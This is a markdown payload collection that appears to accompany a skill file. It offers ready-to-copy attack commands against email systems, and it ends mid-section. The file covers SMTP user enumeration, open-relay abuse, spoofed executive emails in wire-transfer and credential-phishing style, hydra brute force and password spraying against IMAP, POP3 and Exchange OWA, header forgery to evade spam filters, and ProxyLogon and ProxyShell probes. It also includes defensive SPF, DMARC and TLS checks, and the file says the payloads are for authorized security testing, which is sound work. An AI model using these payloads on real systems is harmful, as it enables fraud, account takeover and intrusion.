# Email Protocol Attack Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for email protocol attack testing by category.
> Purpose: Quickly find payloads for specific attack types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [SMTP User Enumeration](#1-smtp-user-enumeration)
2. [SMTP Open Relay Testing](#2-smtp-open-relay-testing)
3. [Email Forgery with swaks](#3-email-forgery-with-swaks)
4. [SPF/DKIM/DMARC Testing](#4-spfdkimdmarc-testing)
5. [IMAP/POP3 Brute Force](#5-imappop3-brute-force)
6. [Exchange Server Attacks](#6-exchange-server-attacks)
7. [Email Header Manipulation](#7-email-header-manipulation)
8. [TLS/STARTTLS Testing](#8-tlsstarttls-testing)
9. [Mail Server Fingerprinting](#9-mail-server-fingerprinting)

---

## 1. SMTP User Enumeration

### VRFY Command Enumeration

```bash
# Manual VRFY single user
echo "VRFY root" | nc mail.target.com 25

# Manual VRFY with common usernames
echo "VRFY admin" | nc mail.target.com 25
echo "VRFY postmaster" | nc mail.target.com 25
echo "VRFY test" | nc mail.target.com 25
echo "VRFY info" | nc mail.target.com 25
echo "VRFY support" | nc mail.target.com 25
echo "VRFY webmaster" | nc mail.target.com 25
```

### EXPN Command Enumeration

```bash
# Manual EXPN to expand mailing lists
echo "EXPN all-users" | nc mail.target.com 25
echo "EXPN staff" | nc mail.target.com 25
echo "EXPN admin" | nc mail.target.com 25
echo "EXPN postmaster" | nc mail.target.com 25
```

### RCPT TO Enumeration

```bash
# Manual RCPT TO testing via raw SMTP session
(echo "HELO test.com"; echo "MAIL FROM: test@test.com"; echo "RCPT TO: admin@target.com"; echo "QUIT") | nc mail.target.com 25

# Test multiple recipients
(echo "HELO test.com"; echo "MAIL FROM: test@test.com"; echo "RCPT TO: nonexistent@target.com"; echo "QUIT") | nc mail.target.com 25

# Compare valid vs invalid responses
(echo "HELO test.com"; echo "MAIL FROM: test@test.com"; echo "RCPT TO: jdoe@target.com"; echo "RCPT TO: xxx999@target.com"; echo "QUIT") | nc mail.target.com 25
```

### Automated Enumeration with smtp-user-enum

```bash
# VRFY method with username list
smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t mail.target.com

# RCPT TO method (more reliable, often not disabled)
smtp-user-enum -M RCPT -U /usr/share/wordlists/usernames.txt -t mail.target.com

# EXPN method
smtp-user-enum -M EXPN -U /usr/share/wordlists/usernames.txt -t mail.target.com

# With custom port and domain
smtp-user-enum -M RCPT -U users.txt -t mail.target.com -p 587 -d target.com

# Multiple methods combined
smtp-user-enum -M VRFY -U users.txt -t mail.target.com -v
smtp-user-enum -M RCPT -U users.txt -t mail.target.com -f admin@test.com
```

### SMTP Timing-Based User Enumeration

```bash
# Compare response times for valid vs invalid users
time (echo "RCPT TO: valid.user@target.com" | nc -w 5 mail.target.com 25)
time (echo "RCPT TO: nonexistent.user9999@target.com" | nc -w 5 mail.target.com 25)

# Script for timing-based enumeration
for user in $(cat users.txt); do
  echo -n "$user: "
  time (echo "HELO test
MAIL FROM: test@test.com
RCPT TO: ${user}@target.com
QUIT" | nc -w 3 mail.target.com 25 2>&1 | grep -E "250|550|551") 2>&1 | grep real
done
```

---

## 2. SMTP Open Relay Testing

### Basic Open Relay Test

```bash
# Test relay from external domain through target server
swaks --to external@otherdomain.com --from test@target.com --server mail.target.com

# Test relay with completely external sender and recipient
swaks --to victim@external.com --from attacker@evil.com --server mail.target.com

# Test relay with various FROM/TO combinations
swaks --to test@gmail.com --from test@target.com --server mail.target.com
swaks --to test@hotmail.com --from anything@evil.com --server mail.target.com
```

### Multi-Scenario Relay Testing

```bash
# Test with % routing (user%domain@target)
swaks --to "victim%external.com@target.com" --from test@test.com --server mail.target.com

# Test with source routing (@target.com:victim@external.com)
swaks --to "@target.com:victim@external.com" --from test@test.com --server mail.target.com

# Test with bang path routing
swaks --to "target.com!external.com!victim" --from test@test.com --server mail.target.com

# Test with IP address literal
swaks --to "victim@[10.0.0.1]" --from test@test.com --server mail.target.com
```

### Relay Testing via Raw SMTP

```bash
# Raw SMTP open relay test - external sender to external recipient
(echo "HELO evil.com"; echo "MAIL FROM: attacker@evil.com"; echo "RCPT TO: victim@external.com"; echo "DATA"; echo "Subject: Relay Test"; echo ""; echo "Test body"; echo "."; echo "QUIT") | nc mail.target.com 25

# Test relay with EHLO instead of HELO
(echo "EHLO evil.com"; echo "MAIL FROM: <attacker@evil.com>"; echo "RCPT TO: <victim@external.com>"; echo "DATA"; echo "Subject: Open Relay Test"; echo ""; echo "Testing open relay"; echo "."; echo "QUIT") | nc mail.target.com 25

# Test relay with authentication attempt bypass
(echo "EHLO test.com"; echo "MAIL FROM: <>"; echo "RCPT TO: victim@external.com"; echo "QUIT") | nc mail.target.com 25
```

### sendemail Relay Testing

```bash
# Test relay with sendemail
sendemail -f attacker@evil.com -t victim@external.com -u "Relay Test" -m "Testing open relay" -s mail.target.com:25

# Test with TLS
sendemail -f attacker@evil.com -t victim@external.com -u "TLS Relay Test" -m "Testing relay over TLS" -s mail.target.com:587 -o tls=yes

# Test with verbose output
sendemail -f test@target.com -t external@gmail.com -u "Relay" -m "Body" -s mail.target.com -v
```

---

## 3. Email Forgery with swaks

### Basic Email Spoofing

```bash
# Spoof internal sender
swaks --to victim@target.com --from ceo@target.com --server mail.target.com \
  --header "Subject: Urgent: Wire Transfer Required" \
  --body "Please process the attached wire transfer immediately."

# Spoof external trusted domain
swaks --to victim@target.com --from support@microsoft.com --server mail.target.com \
  --header "Subject: Your Account Security Alert" \
  --body "Click here to secure your account: http://evil.com/phish"

# Spoof with display name manipulation
swaks --to victim@target.com --from "CEO Name <ceo@target.com>" --server mail.target.com \
  --header "Subject: Confidential Request" \
  --body "Please review the confidential document."
```

### Advanced Email Crafting

```bash
# HTML email with embedded link
swaks --to victim@target.com --from it@target.com --server mail.target.com \
  --header "Subject: IT Password Reset Required" \
  --body-type text/html \
  --body '<html><body><p>Click <a href="http://evil.com/capture">here</a> to reset your password.</p></body></html>'

# Email with attachment
swaks --to victim@target.com --from hr@target.com --server mail.target.com \
  --header "Subject: Updated Employee Handbook" \
  --attach /path/to/malicious.docx \
  --body "Please review the attached document."

# Multi-part email with both HTML and plain text
swaks --to victim@target.com --from admin@target.com \
  --header "Content-Type: multipart/alternative; boundary=boundary123" \
  --body "--boundary123
Content-Type: text/plain; charset=UTF-8

This is the plain text version.

--boundary123
Content-Type: text/html; charset=UTF-8

<html><body><h1>HTML version</h1></body></html>
--boundary123--"
```

### Email with Custom Headers

```bash
# Spoof with reply-to redirection
swaks --to victim@target.com --from executive@target.com \
  --add-header "Reply-To: attacker@evil.com" \
  --add-header "X-Priority: 1 (Highest)" \
  --add-header "Importance: High" \
  --header "Subject: Urgent Business Proposal"

# Spoof with forged Message-ID and Date
swaks --to victim@target.com --from partner@trusted.com \
  --add-header "Message-ID: <1234567890@trusted.com>" \
  --add-header "Date: Mon, 01 Jan 2026 09:00:00 +0000" \
  --header "Subject: Partnership Update"

# Spoof with X-Mailer header to mimic legitimate client
swaks --to victim@target.com --from colleague@target.com \
  --add-header "X-Mailer: Microsoft Outlook 16.0" \
  --add-header "X-Originating-IP: [10.0.0.1]" \
  --header "Subject: Quick Question"
```

### sendemail Forged Email

```bash
# sendemail with spoofed sender
sendemail -f "CEO <ceo@target.com>" -t victim@target.com \
  -u "Confidential: Immediate Action Required" \
  -m "Please process this urgently." \
  -s mail.target.com:25

# sendemail with HTML content
sendemail -f "IT Support <it@target.com>" -t victim@target.com \
  -u "Security Alert" \
  -m "<html><body><a href='http://evil.com'>Click here</a></body></html>" \
  -s mail.target.com:25 \
  -o message-content-type=html

# sendemail with attachment and priority
sendemail -f "HR <hr@target.com>" -t victim@target.com \
  -u "Salary Review 2026" \
  -m "Please find attached." \
  -a malicious.xlsx \
  -s mail.target.com:25 \
  -o message-priority=high
```

---

## 4. SPF/DKIM/DMARC Testing

### SPF Record Analysis

```bash
# Query SPF record
dig TXT target.com +short | grep spf

# Detailed SPF record lookup
dig TXT target.com @8.8.8.8

# Check SPF for subdomain
dig TXT mail.target.com +short

# Analyze SPF with multiple includes
dig TXT target.com +short
dig TXT _spf.google.com +short
dig TXT spf.protection.outlook.com +short
```

### SPF Bypass Testing

```bash
# Test from IP not in SPF record
swaks --to test@target.com --from spoofed@target.com --server mail.target.com \
  --header "Subject: SPF Bypass Test"

# Test SPF softfail (~all) handling
swaks --to test@target.com --from user@target.com \
  --server unauthorized-mailserver.com

# Test with forged Received-SPF header
swaks --to test@target.com --from admin@target.com \
  --add-header "Received-SPF: pass (target.com: domain of admin@target.com designates 10.0.0.1 as permitted sender)"

# Exploit SPF include chain (too many DNS lookups > 10 limit)
dig TXT target.com +short
# If SPF includes exceed lookup limit, SPF evaluation fails open
swaks --to test@target.com --from spoofed@target.com --server mail.target.com
```

### DKIM Testing

```bash
# Enumerate DKIM selectors
dig TXT default._domainkey.target.com +short
dig TXT google._domainkey.target.com +short
dig TXT selector1._domainkey.target.com +short
dig TXT selector2._domainkey.target.com +short
dig TXT s1._domainkey.target.com +short
dig TXT k1._domainkey.target.com +short
dig TXT mail._domainkey.target.com +short
dig TXT policy._domainkey.target.com +short

# Extract DKIM public key
dig TXT default._domainkey.target.com +short

# Check DKIM key length (short keys like 512-bit are breakable)
dig TXT selector1._domainkey.target.com +short | grep -o "p=.*" | tr -d '"' | base64 -d | openssl rsa -pubin -text -noout 2>/dev/null

# Send email without DKIM signature to test enforcement
swaks --to test@target.com --from user@target.com --server mail.target.com \
  --header "Subject: No DKIM Signature Test"
```

### DMARC Testing

```bash
# Query DMARC record
dig TXT _dmarc.target.com +short

# Check for subdomain DMARC policy
dig TXT _dmarc.subdomain.target.com +short

# Test DMARC policy enforcement (p=none allows everything)
swaks --to test@target.com --from spoofed@target.com --server mail.target.com \
  --header "Subject: DMARC Test"

# Test subdomain DMARC bypass (if sp=none or no subdomain policy)
swaks --to test@target.com --from spoofed@subdomain.target.com --server mail.target.com

# Test with alignment mismatch (relaxed vs strict)
swaks --to test@target.com --from user@diffferent-domain.com --server mail.target.com \
  --header "From: user@target.com"
```

### Comprehensive Auth Testing Script

```bash
# Automated SPF/DKIM/DMARC assessment
#!/bin/bash
DOMAIN=$1
echo "[*] SPF Record:"
dig TXT $DOMAIN +short | grep v=spf
echo ""
echo "[*] DMARC Record:"
dig TXT _dmarc.$DOMAIN +short
echo ""
echo "[*] Common DKIM Selectors:"
for sel in default google selector1 selector2 s1 k1 mail policy smtpapi mailjet mandrill; do
  result=$(dig TXT ${sel}._domainkey.$DOMAIN +short 2>/dev/null)
  if [ -n "$result" ]; then
    echo "  [+] Found: ${sel}._domainkey.$DOMAIN"
    echo "      $result"
  fi
done
echo ""
echo "[*] MX Records:"
dig MX $DOMAIN +short
```

---

## 5. IMAP/POP3 Brute Force

### IMAP Credential Testing

```bash
# IMAP brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com imap

# IMAP brute force with username list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mail.target.com imap

# IMAPS (SSL) brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com imaps

# IMAP with specific port
hydra -l admin -P passwords.txt mail.target.com imap -s 143

# IMAP password spray (single password, many users)
hydra -L users.txt -p "Welcome123!" mail.target.com imap
```

### POP3 Credential Testing

```bash
# POP3 brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com pop3

# POP3 with SSL
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com pop3s

# POP3 password spray
hydra -L users.txt -p "Summer2026!" mail.target.com pop3

# POP3 with custom port
hydra -l admin -P passwords.txt mail.target.com pop3 -s 110
```

### Manual IMAP Interaction

```bash
# Manual IMAP login test via openssl
openssl s_client -connect mail.target.com:993 -quiet
# Then type IMAP commands:
# a001 LOGIN username password
# a002 LIST "" "*"
# a003 SELECT INBOX
# a004 FETCH 1 ALL
# a005 LOGOUT

# Manual IMAP without TLS
nc mail.target.com 143
# a001 LOGIN username password
# a002 LIST "" "*"
# a003 SELECT INBOX
# a004 LOGOUT

# Manual POP3 login test
nc mail.target.com 110
# USER username
# PASS password
# LIST
# RETR 1
# QUIT
```

### mutt Mailbox Access

```bash
# Connect to IMAP mailbox with mutt
mutt -f imaps://user:password@mail.target.com/INBOX

# Connect to specific IMAP folder
mutt -f imaps://user:password@mail.target.com/Sent

# Connect to POP3 mailbox
mutt -f pops://user:password@mail.target.com/

# IMAP over non-standard port
mutt -f imaps://user:password@mail.target.com:993/INBOX
```

### Credential Harvesting via IMAP

```bash
# Test for default or weak credentials on common accounts
for user in admin postmaster info support webmaster helpdesk; do
  echo "[*] Testing $user..."
  hydra -l $user -P common-passwords.txt mail.target.com imap -t 1 -W 3
done

# Test common credential pairs
for pair in "admin:admin" "admin:password" "admin:123456" "postmaster:postmaster" "test:test"; do
  user=$(echo $pair | cut -d: -f1)
  pass=$(echo $pair | cut -d: -f2)
  echo "a001 LOGIN $user $pass" | openssl s_client -connect mail.target.com:993 -quiet 2>/dev/null | grep -E "OK|NO|BAD"
done
```

---

## 6. Exchange Server Attacks

### Autodiscover Enumeration

```bash
# Enumerate Exchange Autodiscover endpoint
curl -s https://mail.target.com/Autodiscover/Autodiscover.xml

# Autodiscover with basic authentication probing
curl -s -X POST https://mail.target.com/Autodiscover/Autodiscover.xml \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>user@target.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'

# Autodiscover via different URL patterns
curl -s https://autodiscover.target.com/Autodiscover/Autodiscover.xml
curl -s http://autodiscover.target.com/Autodiscover/Autodiscover.xml
curl -s https://mail.target.com/autodiscover/autodiscover.xml
```

### OWA (Outlook Web Access) Probing

```bash
# Check OWA endpoint
curl -s -I https://mail.target.com/owa/

# Check for OWA version disclosure
curl -s https://mail.target.com/owa/ | grep -i "exchange\|owa\|outlook\|version"

# OWA login page analysis
curl -s https://mail.target.com/owa/auth/logon.aspx | grep -i "hidden\|form\|action"

# Test OWA with basic auth
curl -s -I -u "domain\\user:password" https://mail.target.com/owa/
```

### Exchange ActiveSync Testing

```bash
# Probe ActiveSync endpoint
curl -s -I https://mail.target.com/Microsoft-Server-ActiveSync

# ActiveSync options request
curl -s -X OPTIONS https://mail.target.com/Microsoft-Server-ActiveSync \
  -H "MS-ASProtocolVersion: 14.1"

# ActiveSync with credentials
curl -s -u "user@target.com:password" \
  "https://mail.target.com/Microsoft-Server-ActiveSync?Cmd=Sync&User=user@target.com&DeviceId=test&DeviceType=test"
```

### Exchange Web Services (EWS)

```bash
# Probe EWS endpoint
curl -s -I https://mail.target.com/EWS/Exchange.asmx

# EWS with NTLM authentication
curl -s --ntlm -u "domain\\user:password" https://mail.target.com/EWS/Exchange.asmx

# EWS SOAP request to enumerate folders
curl -s -X POST https://mail.target.com/EWS/Exchange.asmx \
  -H "Content-Type: text/xml" \
  -u "user@target.com:password" \
  -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><FindFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" Traversal="Shallow"><FolderShape><t:BaseShape>Default</t:BaseShape></FolderShape><ParentFolderIds><t:DistinguishedFolderId Id="msgfolderroot"/></ParentFolderIds></FindFolder></soap:Body></soap:Envelope>'
```

### Exchange Credential Testing

```bash
# Brute force Exchange OWA
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com https-post-form \
  "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:F=incorrect"

# Password spray against Exchange
for pass in "Welcome1!" "Summer2026" "Password1" "Company2026!"; do
  hydra -L users.txt -p "$pass" mail.target.com https-post-form \
    "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:F=incorrect" -t 1
done

# Test Exchange PowerShell remoting
curl -s -u "user@target.com:password" -X POST \
  https://mail.target.com/powershell?serializationLevel=Full \
  -H "Content-Type: application/soap+xml"
```

### Exchange Version Detection

```bash
# Check Exchange version via headers
curl -s -I https://mail.target.com/owa/ | grep -i "x-powered-by\|x-aspnet-version\|server"

# Check via /ecp endpoint
curl -s https://mail.target.com/ecp/ | grep -i "exchange\|version"

# Check via RPC endpoint
curl -s -I https://mail.target.com/rpc/rpcproxy.dll

# Enumerate Exchange internal URIs
curl -s https://mail.target.com/autodiscover/autodiscover.xml -u "user:pass" | grep -oP 'https?://[^<]+'
```

---

## 7. Email Header Manipulation

### Basic Header Injection

```bash
# SMTP header injection via swaks
swaks --to victim@target.com --from attacker@evil.com \
  --add-header "X-Spam-Status: No, score=-100" \
  --add-header "X-Original-Sender: legitimate@trusted.com" \
  --header "Subject: Legitimate Looking Email"

# BCC header injection
swaks --to victim@target.com --from admin@target.com \
  --add-header "Bcc: attacker@evil.com" \
  --header "Subject: Internal Memo"

# Remove tracking headers
swaks --to victim@target.com --from spoofed@target.com \
  --drop-header "Received" \
  --drop-header "X-Originating-IP" \
  --header "Subject: Clean Headers"
```

### Sender Display Name Spoofing

```bash
# Unicode homoglyph in display name
swaks --to victim@target.com --from "CEO <attacker@evil.com>" \
  --header "Subject: Urgent" --body "Transfer funds immediately."

# Display name only spoof (From: "CEO Name" <random@domain.com>)
swaks --to victim@target.com --from "John Smith CEO <attacker@evil.com>" \
  --header "Subject: Confidential"

# Right-to-left override attack
swaks --to victim@target.com --from "staff@moc.tegrat <attacker@evil.com>" \
  --header "Subject: Notice"

# Zero-width character injection in sender
swaks --to victim@target.com --from "admin@target.com​" \
  --header "Subject: Test"
```

### Routing Header Manipulation

```bash
# Add fake Received headers to appear internal
swaks --to victim@target.com --from internal@target.com \
  --add-header "Received: from internal-mail.target.com (10.0.0.1) by mail.target.com with SMTP id ABC123"

# X-Originating-IP spoofing
swaks --to victim@target.com --from external@other.com \
  --add-header "X-Originating-IP: [10.0.0.1]" \
  --header "Subject: From Internal"

# Forged Message-ID matching target domain
swaks --to victim@target.com --from user@target.com \
  --add-header "Message-ID: <AABBCCDD.123456789@mail.target.com>" \
  --header "Subject: Internal Thread"

# Thread injection with fake In-Reply-To
swaks --to victim@target.com --from colleague@target.com \
  --add-header "In-Reply-To: <original-message-id@target.com>" \
  --add-header "References: <original-message-id@target.com>" \
  --header "Subject: Re: Project Update"
```

### Anti-Spam Header Bypass

```bash
# Forge spam filter bypass headers
swaks --to victim@target.com --from spoofed@external.com \
  --add-header "X-Spam-Flag: NO" \
  --add-header "X-Spam-Score: -100.0" \
  --add-header "X-Spam-Status: No, score=-100.0 required=5.0 tests=none" \
  --add-header "X-PHP-Originating-Script: 1000:legitimate_script.php" \
  --header "Subject: Not Spam"

# Precedence header to bypass filters
swaks --to victim@target.com --from newsletter@target.com \
  --add-header "Precedence: bulk" \
  --add-header "List-Unsubscribe: <mailto:unsubscribe@target.com>" \
  --add-header "X-Mailer: Mailchimp" \
  --header "Subject: Newsletter"
```

---

## 8. TLS/STARTTLS Testing

### STARTTLS on SMTP

```bash
# Test STARTTLS availability and certificate
openssl s_client -starttls smtp -connect mail.target.com:25 -showcerts

# Check SMTP STARTTLS support via telnet/nc
(echo "EHLO test.com"; sleep 2) | nc mail.target.com 25 | grep STARTTLS

# Test TLS version support
openssl s_client -starttls smtp -connect mail.target.com:25 -tls1 2>&1 | grep -E "Protocol|Cipher"
openssl s_client -starttls smtp -connect mail.target.com:25 -tls1_1 2>&1 | grep -E "Protocol|Cipher"
openssl s_client -starttls smtp -connect mail.target.com:25 -tls1_2 2>&1 | grep -E "Protocol|Cipher"
openssl s_client -starttls smtp -connect mail.target.com:25 -tls1_3 2>&1 | grep -E "Protocol|Cipher"
```

### IMAP/POP3 TLS Testing

```bash
# Test IMAPS (port 993)
openssl s_client -connect mail.target.com:993 -showcerts

# Test POP3S (port 995)
openssl s_client -connect mail.target.com:995 -showcerts

# Test IMAP STARTTLS (port 143)
openssl s_client -starttls imap -connect mail.target.com:143 -showcerts

# Test POP3 STARTTLS (port 110)
openssl s_client -starttls pop3 -connect mail.target.com:110 -showcerts

# Test SMTPS (port 465)
openssl s_client -connect mail.target.com:465 -showcerts
```

### Certificate Analysis

```bash
# Extract and analyze certificate
openssl s_client -starttls smtp -connect mail.target.com:25 2>/dev/null | openssl x509 -noout -text | grep -E "Issuer|Subject|Not Before|Not After|Signature Algorithm|Public-Key"

# Check certificate expiration
openssl s_client -starttls smtp -connect mail.target.com:25 2>/dev/null | openssl x509 -noout -dates

# Check certificate subject and issuer
openssl s_client -starttls smtp -connect mail.target.com:25 2>/dev/null | openssl x509 -noout -subject -issuer

# Verify certificate chain
openssl s_client -starttls smtp -connect mail.target.com:25 -verify_return_error 2>&1 | grep -E "verify|Verify|error"
```

### Cipher Suite Testing

```bash
# List supported ciphers
nmap --script ssl-enum-ciphers -p 465 mail.target.com

# Test for weak ciphers
openssl s_client -starttls smtp -connect mail.target.com:25 -cipher EXPORT 2>&1 | grep -E "Cipher|error"
openssl s_client -starttls smtp -connect mail.target.com:25 -cipher LOW 2>&1 | grep -E "Cipher|error"
openssl s_client -starttls smtp -connect mail.target.com:25 -cipher RC4 2>&1 | grep -E "Cipher|error"

# Test for NULL cipher
openssl s_client -starttls smtp -connect mail.target.com:25 -cipher NULL 2>&1 | grep -E "Cipher|error"

# Test specific cipher suites
openssl s_client -starttls smtp -connect mail.target.com:25 -cipher AES256-SHA 2>&1 | grep "Cipher :"
```

### STARTTLS Downgrade Testing

```bash
# Test if STARTTLS can be stripped (man-in-the-middle scenario)
# Attempt to send email without STARTTLS when server supports it
(echo "EHLO test.com"; echo "MAIL FROM: test@test.com"; echo "RCPT TO: test@target.com"; echo "DATA"; echo "Subject: No TLS Test"; echo ""; echo "Sent without TLS"; echo "."; echo "QUIT") | nc mail.target.com 25

# Check if server enforces TLS for submission
nc mail.target.com 587
# If EHLO returns without STARTTLS requirement, submission may allow plaintext

# Test SSLv3 fallback (if supported, vulnerable to POODLE)
openssl s_client -starttls smtp -connect mail.target.com:25 -ssl3 2>&1 | grep -E "Protocol|Cipher|error"
```

---

## 9. Mail Server Fingerprinting

### Banner Grabbing and Version Detection

```bash
# SMTP banner grabbing
nc mail.target.com 25

# Capture full SMTP EHLO response
(echo "EHLO test.com"; sleep 2) | nc mail.target.com 25

# Compare HELO vs EHLO responses
(echo "HELO test.com"; sleep 1) | nc mail.target.com 25
(echo "EHLO test.com"; sleep 1) | nc mail.target.com 25
```

### smtpmap Fingerprinting

```bash
# Basic fingerprinting
smtpmap mail.target.com

# Fingerprint with specific port
smtpmap mail.target.com -p 587

# Verbose output for detailed analysis
smtpmap mail.target.com -v
```

### nmap Mail Service Detection

```bash
# Service version detection for all mail ports
nmap -sV -p 25,110,143,465,587,993,995 target.com

# SMTP specific nmap scripts
nmap --script smtp-commands -p 25 mail.target.com
nmap --script smtp-enum-users -p 25 mail.target.com
nmap --script smtp-open-relay -p 25 mail.target.com
nmap --script smtp-brute -p 25 mail.target.com

# SSL/TLS detection on mail ports
nmap --script ssl-cert -p 465,993,995 mail.target.com
nmap --script ssl-enum-ciphers -p 465 mail.target.com
```

### IMAP/POP3 Fingerprinting

```bash
# IMAP banner grabbing
nc mail.target.com 143

# IMAP capability query
nc mail.target.com 143
# a001 CAPABILITY

# POP3 banner grabbing
nc mail.target.com 110

# POP3 capability query
nc mail.target.com 110
# CAPA
```

### Software-Specific Detection

```bash
# Detect Postfix
(echo "EHLO test.com"; sleep 1) | nc mail.target.com 25 | grep -i postfix

# Detect Sendmail
(echo "EHLO test.com"; sleep 1) | nc mail.target.com 25 | grep -i sendmail

# Detect Exchange
curl -s -I https://mail.target.com/owa/ | grep -i "x-powered-by\|server\|asp"
curl -s -I https://mail.target.com/Microsoft-Server-ActiveSync | grep -i "server\|ms-server-activesync"

# Detect Dovecot
nc mail.target.com 143 | head -1
# Dovecot responds with: * OK [CAPABILITY ...] Dovecot ready.

# Detect Courier
nc mail.target.com 143 | head -1
# Courier responds with: * OK [CAPABILITY ...] Courier-IMAP ready.
```

### DNS-Based Mail Infrastructure Mapping

```bash
# Full mail infrastructure enumeration
echo "[*] MX Records:"
dig MX target.com +short
echo ""
echo "[*] SPF Record:"
dig TXT target.com +short | grep spf
echo ""
echo "[*] DMARC Record:"
dig TXT _dmarc.target.com +short
echo ""
echo "[*] DKIM Selectors:"
for sel in default google selector1 selector2 s1 k1 mail; do
  result=$(dig TXT ${sel}._domainkey.target.com +short 2>/dev/null)
  if [ -n "$result" ]; then echo "  [+] ${sel}: $result"; fi
done
echo ""
echo "[*] Mail-related SRV Records:"
dig SRV _smtp._tcp.target.com +short
dig SRV _imaps._tcp.target.com +short
dig SRV _submission._tcp.target.com +short
dig SRV _autodiscover._tcp.target.com +short
echo ""
echo "[*] Autodiscover CNAME:"
dig CNAME autodiscover.target.com +short
```

### nailgun SMTP Stress Testing

```bash
# Basic nailgun connection test
nailgun -h mail.target.com -p 25

# Test SMTP response handling under load
nailgun -h mail.target.com -p 25 -c 10 -i 100

# Test SMTP with authentication
nailgun -h mail.target.com -p 587 -auth login:user:password

# Test SMTP throughput
nailgun -h mail.target.com -p 25 -t 5
```

---

## 10. Comprehensive Email Authentication Analysis

### SPF/DKIM/DMARC Combined Assessment Script

```bash
#!/bin/bash
# Full email authentication posture assessment
DOMAIN=$1

echo "=== Email Authentication Assessment: $DOMAIN ==="
echo ""

echo "[1] SPF Record Analysis"
spf_record=$(dig TXT $DOMAIN +short | grep v=spf)
if [ -n "$spf_record" ]; then
    echo "  SPF: $spf_record"
    # Check for ~all (softfail) vs -all (hardfail) vs +all (allow all)
    if echo "$spf_record" | grep -q '\+all'; then
        echo "  [CRITICAL] SPF allows all senders (+all)"
    elif echo "$spf_record" | grep -q '\~all'; then
        echo "  [MEDIUM] SPF softfail (~all) - not enforced"
    elif echo "$spf_record" | grep -q '\-all'; then
        echo "  [OK] SPF hardfail (-all) - properly enforced"
    fi
    # Check DNS lookup limit
    include_count=$(echo "$spf_record" | grep -o 'include:' | wc -l)
    echo "  Include chains: $include_count (limit: 10)"
else
    echo "  [CRITICAL] No SPF record found"
fi
echo ""

echo "[2] DMARC Record Analysis"
dmarc=$(dig TXT _dmarc.$DOMAIN +short)
if [ -n "$dmarc" ]; then
    echo "  DMARC: $dmarc"
    if echo "$dmarc" | grep -q 'p=none'; then
        echo "  [HIGH] DMARC policy=none - no enforcement"
    elif echo "$dmarc" | grep -q 'p=quarantine'; then
        echo "  [MEDIUM] DMARC policy=quarantine"
    elif echo "$dmarc" | grep -q 'p=reject'; then
        echo "  [OK] DMARC policy=reject - properly enforced"
    fi
else
    echo "  [HIGH] No DMARC record found"
fi
echo ""

echo "[3] Open Relay Test"
swaks --to test@example.com --from test@test.com --server mail.$DOMAIN --timeout 10 2>&1 | grep -E "response|250|550|relaying"
```

---

## 11. Email Header Forensic Analysis

### Full Header Extraction and Timeline Reconstruction

```bash
# Extract complete email headers from .eml file
python3 -c "
import sys
from email import policy
from email.parser import BytesParser

with open('suspicious_email.eml', 'rb') as f:
    msg = BytesParser(policy=policy.default).parse(f)

# Print all headers in order
for k, v in msg.items():
    print(f'{k}: {v}')

print()

# Analyze Received chain (bottom-up = source to destination)
print('=== Received Chain Analysis ===')
received = msg.get_all('Received', [])
for i, r in enumerate(reversed(received)):
    print(f'  Hop {i+1}: {r[:120]}')
"
```

### Phishing Simulation Payload Construction

```bash
# Create a realistic phishing simulation email
swaks --to target@company.com \
  --from "IT Helpdesk <it.helpdesk@company.com>" \
  --server mail.company.com \
  --header "Subject: Urgent: Password Expiration Notice" \
  --header "X-Priority: 1" \
  --header "Importance: high" \
  --body-type text/html \
  --body '<html><body>
<style>body{font-family:Arial,sans-serif;}</style>
<div style="max-width:600px;margin:0 auto;padding:20px;">
<h2 style="color:#0078d4;">Password Expiration Notice</h2>
<p>Your corporate password will expire in 24 hours.</p>
<p>To avoid account lockout, please reset your password immediately:</p>
<p><a href="https://phishing-test.company.com/reset" style="background:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;">Reset Password Now</a></p>
<p style="color:#666;font-size:12px;">If you did not request this change, contact IT Support.</p>
</div></body></html>' \
  --add-header "X-Mailer: Microsoft Outlook 16.0" \
  --add-header "Thread-Topic: Password Reset" \
  --add-header "Thread-Index: AQHRandomBase64String=="

# Log the test for engagement evidence
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) - Phishing simulation sent to target@company.com" >> phishing_log.txt
```

### Microsoft Exchange ProxyShell/ProxyLogon Detection

```bash
# Check for ProxyLogon (CVE-2021-26855) via SSRF
curl -s -o /dev/null -w "%{http_code}" \
  "https://mail.target.com/owa/auth/logon.aspx" \
  -H "Cookie: X-BEResource=localhost~443/powershell?serializationLevel=Full"

# Check for ProxyShell (CVE-2021-34473) via SSRF
curl -s "https://mail.target.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi/" \
  -H "Content-Type: application/json" \
  -d '{"Email":"admin@target.com"}'

# Enumerate Exchange server version for known CVEs
curl -s -I https://mail.target.com/owa/ | grep -iE "server|x-powered-by|x-aspnet"

# Check for CVE-2021-26857 (Unified Messaging exploit)
curl -s -X POST https://mail.target.com/owa/auth/logon.aspx \
  -H "Content-Type: application/json" \
  -d '{"legacyDN":"/o=First Organization/ou=Exchange Administrative Group/cn=Recipients/cn=admin","subject":"test"}' \
  -o /dev/null -w "%{http_code}"
```

### Email Header Forensic Analysis

```bash
